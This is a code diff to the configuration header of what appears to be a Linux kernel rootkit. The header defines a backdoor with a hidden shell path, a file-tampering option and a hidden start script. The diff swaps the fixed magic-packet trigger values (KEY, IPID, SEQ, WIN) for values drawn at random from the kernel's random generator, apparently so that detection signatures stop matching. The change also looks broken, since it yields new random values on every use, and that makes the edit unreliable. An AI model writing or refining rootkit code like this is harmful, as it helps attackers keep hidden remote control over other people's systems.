@@ -12,10 +12,10 @@
 
 #ifdef CONFIG_BACKDOOR
 #   define SHELL_PATH "/"HIDE"/"HIDE"_shell"
-#   define KEY 0x6de56d3b
-#   define IPID 3429
-#   define SEQ 15123
-#   define WIN 9965
+#   define KEY generate_random_key()
+#   define IPID generate_random_ipid()
+#   define SEQ generate_random_seq()
+#   define WIN generate_random_win()
 #endif
 
 #ifdef CONFIG_FILE_TAMPERING
@@ -24,3 +24,39 @@
 #endif
 
 #define START_SCRIPT "/"HIDE"/"HIDE"_start"
+
+// Dynamically generated configurations
+#include <linux/random.h>
+
+static inline unsigned int generate_random_key(void)
+{
+    unsigned int key;
+    get_random_bytes(&key, sizeof(key));
+    return key;
+}
+
+static inline unsigned short generate_random_ipid(void)
+{
+    unsigned short ipid;
+    get_random_bytes(&ipid, sizeof(ipid));
+    return ipid;
+}
+
+static inline unsigned int generate_random_seq(void)
+{
+    unsigned int seq;
+    get_random_bytes(&seq, sizeof(seq));
+    return seq;
+}
+
+static inline unsigned short generate_random_win(void)
+{
+    unsigned short win;
+    get_random_bytes(&win, sizeof(win));
+    return win;
+}
+
+#define DYNAMIC_KEY generate_random_key()
+#define DYNAMIC_IPID generate_random_ipid()
+#define DYNAMIC_SEQ generate_random_seq()
+#define DYNAMIC_WIN generate_random_win()
